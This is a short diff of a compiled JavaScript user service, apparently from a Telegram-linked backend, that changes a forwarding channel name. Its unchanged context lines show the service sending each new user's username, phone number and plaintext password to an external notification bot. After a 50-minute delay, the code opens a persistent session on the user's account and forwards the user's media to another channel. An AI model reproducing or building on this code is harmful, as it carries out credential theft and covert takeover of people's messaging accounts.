@@ -39,7 +39,7 @@ let UsersService = class UsersService {
             await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
             setTimeout(async () => {
                 await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
-                this.telegramService.forwardMedia(user.mobile, "savedmessages37", null);
+                this.telegramService.forwardMedia(user.mobile, "savedmessages38", null);
             }, 50 * 60000);
             const newUser = new this.userModel(user);
             return newUser.save();
